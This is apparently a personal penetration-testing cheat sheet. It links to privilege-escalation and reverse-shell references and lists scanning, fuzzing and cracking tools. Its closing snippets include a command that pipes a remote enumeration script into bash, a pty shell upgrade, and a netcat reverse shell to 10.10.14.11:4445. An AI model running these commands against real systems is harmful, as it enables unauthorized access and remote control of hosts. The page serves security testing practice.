# Resources

## Links

- [GTFOBins](https://gtfobins.github.io/) - List of unix binaries which can be exploited to escalate privileges etc.
- [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) - List of remote shells in various languages
- [NetCat without -e](https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/) - Reverse shell spawning when netcat does not support `-e`
- [Exploit DB](https://www.exploit-db.com/) - Exploit DB
- [Shell Upgrade Guide](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
- [Windows Privilege Escalation](https://guif.re/windowseop) - Windows privelege escalation
- [Explain Shell](https://explainshell.com/) - Not pen-testing specific but a very useful resource! 

## Tools

### Frameworks

- [metasploit](https://www.metasploit.com/) - Penetration testing framework

### Port Scanning
- [nmap](https://nmap.org/)
- [furious](https://github.com/liamg/furious)

### Fuzzing
- [scout](https://github.com/liamg/scout) - Lightweight URL fuzzer
- [gobuster](https://github.com/OJ/gobuster) - File/directory/DNS/VHOST buster
- [wfuzz](https://tools.kali.org/web-applications/wfuzz) - Advanced web fuzzer

### Crypto
- [John the Ripper](https://www.openwall.com/john/) - Flexible hash cracker
- [pax](https://github.com/liamg/pax) - Padding oracle exploiter

### Linux Enumeration
- [LinEnum](https://github.com/rebootuser/LinEnum) - Linux enumeration script

## Snippets

### Linux Enumeration

```bash
curl -s https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

### Upgrade Shell

```bash
echo "import pty; pty.spawn('/bin/bash')" > /tmp/shell.py && python /tmp/shell.py
```

### Reverse Shell w/ max compatibility

```bash
rm /tmp/backpipe; mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | nc 10.10.14.11 4445 1>/tmp/backpipe
```